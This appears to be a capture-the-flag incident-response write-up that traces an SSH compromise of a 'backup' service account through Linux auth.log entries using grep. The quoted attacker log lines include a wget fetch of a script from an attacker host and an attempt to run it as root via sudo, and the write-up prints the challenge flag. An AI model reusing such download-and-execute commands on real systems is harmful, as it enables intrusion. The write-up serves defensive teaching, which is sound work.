🔐 Log Me In — Incident Response Write-Up

Linux Authentication Logs • SSH Investigation • Privilege Escalation Analysis

Challenge Summary

A threshold alert was triggered after numerous failed SSH authentication attempts were detected against prodserver01.

Although initially classified as automated scanning activity, a later investigation revealed that one authentication attempt had successfully compromised the system.

🎯 Objective

Determine the command executed by the attacker after gaining access.

Flag: ewQI9uWqJ0Et

Initial Assessment

Key Indicators
  • Successful login occurred around 3 AM.
  • Compromised account was a service account.
  • Session lasted less than two minutes.
  • Two privilege escalation attempts were recorded.
  • Commands were logged in full.

The challenge hints suggested that the attacker compromised a non-human Linux account such as: 

backup
jenkins
postgres
mysql
www-data
daemon

Step 1 — Identify Successful SSH Logins

grep "sshd.*Accepted" auth.log

# or

grep "Accepted" auth.log

The successful login was identified as:

Jan 8 03:47:22 prodserver01 sshd[39755]:
Accepted password for backup from 192.168.1.200 port 43210 ssh2
Indicator Observation
Time 03:47 AM
Account backup
Source IP 192.168.1.200
Authentication Password
Account Type Service Account

Step 2 — Narrow Investigation Window

grep "Jan 8" auth.log | grep -Ei "sudo|COMMAND=|not allowed|su:"

Rather than searching the entire log file, the investigation focused on sudo activity around the compromise window.

Step 3 — Privilege Escalation Attempts

Jan 8 03:47:55 sudo:
backup : USER=root ;
COMMAND=/bin/bash /tmp/update.sh --key ewQI9uWqJ0Et

Immediately followed by:

pam_unix(sudo:auth): authentication failure

The attacker attempted to execute a malicious shell script as root, but authentication failed.

Second Attempt

COMMAND=/usr/bin/wget http://192.168.1.200/update.sh -O /tmp/update.sh

Again followed by another authentication failure.

Attack Timeline

03:47:22

Successful SSH login using the backup account.

03:47:55

Attempted to execute /bin/bash /tmp/update.sh as root.

03:48:03

Sudo authentication failed.

03:48:31

Attempted to download payload from attacker-controlled server.

03:48:33

Second sudo authentication failure.

Why This Was Malicious

  • Interactive login using a service account.
  • Execution from /tmp, a common attacker staging directory.
  • Download-and-execute malware behavior.
  • Repeated attempts to obtain root privileges.

Investigation Commands Used

# Successful logins
grep "Accepted" auth.log

# Sudo activity
grep sudo auth.log

# Privilege escalation
grep -Ei "sudo|COMMAND=|su:|not allowed" auth.log

# Restrict investigation
grep "Jan 8" auth.log

# Filter compromised account
grep "backup" auth.log

# Trace SSH session
grep "\[39755\]" auth.log

Lessons Learned

  1. Never dismiss authentication alerts as simple scanner noise.
  2. Interactive logins using service accounts deserve immediate investigation.
  3. Linux authentication logs provide excellent forensic evidence.
  4. Filtering by timestamps, usernames and sudo activity dramatically reduces investigation time.
